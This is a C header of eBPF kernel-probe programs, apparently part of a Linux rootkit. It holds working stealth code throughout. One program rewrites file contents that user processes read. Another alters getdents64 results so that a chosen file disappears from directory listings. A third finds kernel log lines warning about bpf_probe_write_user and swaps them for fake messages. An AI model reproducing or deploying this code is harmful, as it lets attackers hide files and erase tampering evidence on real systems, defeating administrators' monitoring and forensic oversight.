/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2021
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _FS_ACTION_USER_H_
#define _FS_ACTION_USER_H_

SEC("kprobe/fa_override_content_user")
int fa_override_content_user(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct fa_fd_action_t *fd_action = (struct fa_fd_action_t *)bpf_map_lookup_elem(&fa_fd_actions, &pid_tgid);
    if (!fd_action)
        return 0;

    struct fa_fd_key_t fd_key = {
        .fd = fd_action->fd,
        .pid = pid_tgid >> 32,
    };

    struct fa_fd_attr_t *fd_attr = (struct fa_fd_attr_t *)bpf_map_lookup_elem(&fa_fd_attrs, &fd_key);
    if (!fd_attr || !fd_attr->read_buf)
        return 0;

    struct fa_fd_content_key_t fd_content_key = {
        .id = fd_attr->action.override_id,
        .chunk = fd_attr->override_chunk,
    };

    struct fa_fd_content_t *fd_content = (struct fa_fd_content_t *)bpf_map_lookup_elem(&fa_fd_contents, &fd_content_key);
    if (!fd_content)
        return 0;

    int i = 0;

#pragma unroll
    for (i = 0; i != sizeof(fd_content->content); i++)
    {
        if (i == fd_content->size)
            break;

        bpf_probe_write_user(fd_attr->read_buf + i, &fd_content->content[i], 1);
    }

    return 0;
}

__attribute__((always_inline)) void copy(void *dst, void *src, int len)
{
#pragma unroll
    for (int i = 0; i != 10; i++)
    {
        if (len - 20 > 0)
        {
            bpf_probe_write_user(dst, src, 20);
            dst += 20;
            src += 20;

            len -= 20;
        }
    }

    if (len == 0)
        return;

#pragma unroll
    for (int i = 0; i != 20; i++)
    {
        if (len > 0)
        {

            bpf_probe_write_user(dst, src, 1);
            dst++;
            src++;

            len--;
        }
    }
}

SEC("kprobe/fa_override_getdents_user")
int fa_override_getdents(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct fa_getdents_t *getdents = (struct fa_getdents_t *)bpf_map_lookup_elem(&fa_getdents, &pid_tgid);
    if (!getdents)
        return 0;

    int size = (unsigned int)PT_REGS_RC(ctx);

    char buff[256] = {};
    u64 hash;

    unsigned short reclen = 0;

#pragma unroll
    for (int i = 0; i != 100; i++)
    {
        if (!getdents->src)
        {
            bpf_probe_read_str(buff, sizeof(buff), (void *)getdents->dirent->d_name);

            hash = FNV_BASIS;
            update_hash_str(&hash, buff);

            bpf_probe_read(&reclen, sizeof(reclen), (void *)&getdents->dirent->d_reclen);

            if (hash == getdents->hidden_hash)
            {               
                getdents->reclen = reclen;
                getdents->src = (void *)getdents->dirent + reclen;
            }
        }
        getdents->read += reclen;

        if (getdents->read < size && getdents->src && getdents->dirent != getdents->src)
        {
            struct linux_dirent64 src;
            bpf_probe_read(&src, sizeof(src), getdents->src);
            src.d_off -= reclen;

            bpf_probe_write_user((void *)getdents->dirent, &src, sizeof(src));

            int remains = src.d_reclen - sizeof(struct linux_dirent64);
            if (remains > 0)
            {
                bpf_probe_read(buff, sizeof(buff), getdents->src + sizeof(struct linux_dirent64));
                // currenlty doesn't support file longer than 220
                copy((void *)getdents->dirent + sizeof(struct linux_dirent64), buff, remains);
            }

            getdents->src = (void *)getdents->src + src.d_reclen;
            reclen = src.d_reclen;
        }

        getdents->dirent = (void *)getdents->dirent + reclen;
    }

    bpf_tail_call(ctx, &fa_progs, FA_OVERRIDE_GET_DENTS_PROG);

    return 0;
}

SYSCALL_KRETPROBE(getdents64)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct fa_getdents_t *getdents = (struct fa_getdents_t *)bpf_map_lookup_elem(&fa_getdents, &pid_tgid);
    if (!getdents)
        return 0;

    if (getdents->reclen)
    {
        int size = (int)PT_REGS_RC(ctx);
        int ret = size - getdents->reclen;
        bpf_override_return(ctx, ret > 0 ? ret : 0);
    }

    return 0;
}


#define BPF_PROBE_WRITE_USER_HASH 0xada8e5f3e94cf1f8
#define BPF_GET_PROBE_WRITE_PROTO_HASH 0x55c7edee212d1ef4
#define IS_BPF_STR_HASH(hash) hash == BPF_PROBE_WRITE_USER_HASH || hash == BPF_GET_PROBE_WRITE_PROTO_HASH

#define FAKE_KSMG_NUM 30

SEC("kprobe/fa_fill_with_zero_user")
int fa_fill_with_zero_user(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct fa_fd_action_t *fd_action = (struct fa_fd_action_t *)bpf_map_lookup_elem(&fa_fd_actions, &pid_tgid);
    if (!fd_action)
        return 0;

    struct fa_fd_key_t fd_key = {
        .fd = fd_action->fd,
        .pid = pid_tgid >> 32,
    };

    struct fa_fd_attr_t *fd_attr = (struct fa_fd_attr_t *)bpf_map_lookup_elem(&fa_fd_attrs, &fd_key);
    if (!fd_attr)
        return 0;

    const char c = '\0';

#pragma unroll
    for (int i = 0; i != 256; i++)
    {
        if (i == fd_attr->read_size - 1)
            break;
        bpf_probe_write_user(fd_attr->read_buf + i, &c, 1);
    }

    return 0;
}

SEC("kprobe/fa_kmsg_user")
int fa_kmsg_user(struct pt_regs *ctx)
{
    int retval = PT_REGS_RC(ctx);

    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct fa_fd_action_t *fd_action = (struct fa_fd_action_t *)bpf_map_lookup_elem(&fa_fd_actions, &pid_tgid);
    if (!fd_action)
        return 0;

    struct fa_fd_key_t fd_key = {
        .fd = fd_action->fd,
        .pid = pid_tgid >> 32,
    };

    struct fa_fd_attr_t *fd_attr = (struct fa_fd_attr_t *)bpf_map_lookup_elem(&fa_fd_attrs, &fd_key);
    if (!fd_attr || !fd_attr->read_buf)
        return 0;

    char buf[128];
    bpf_probe_read(buf, sizeof(buf), fd_attr->read_buf);

    u64 offset = 0, hash = 0;

    // keep timestamp, override only the message content
#pragma unroll
    for (int i = 0; i != 128; i++)
    {
        if (buf[i] == ';' && !offset)
        {
            hash = FNV_BASIS;
            offset = i + 1;
            continue;
        }
        else if (buf[i] == ' ')
        {
            hash = FNV_BASIS;
            continue;
        }
        update_hash_byte(&hash, buf[i]);

        if (IS_BPF_STR_HASH(hash))
            break;
    }

    if (IS_BPF_STR_HASH(hash))
    {
        int key = fd_attr->kmsg % FAKE_KSMG_NUM;
        struct fa_kmsg_t *kmsg = (struct fa_kmsg_t *)bpf_map_lookup_elem(&fa_kmsgs, &key);
        if (!kmsg)
            return 0;
        fd_attr->kmsg++;

        bpf_probe_write_user(fd_attr->read_buf + offset, kmsg->str, sizeof(kmsg->str) - 1);

        fd_attr->read_buf += offset + sizeof(kmsg->str) - 1;
        fd_attr->read_size = retval - (offset + sizeof(kmsg->str) - 1);

        fd_attr->action.id |= FA_OVERRIDE_RETURN_ACTION;
        fd_attr->action.return_value = kmsg->size + offset;

        // be sure to override everything
        bpf_tail_call(ctx, &fa_progs, FA_FILL_WITH_ZERO_PROG);
    }
    else 
        fd_attr->action.id &= ~FA_OVERRIDE_RETURN_ACTION;

    return 0;
}

#endif
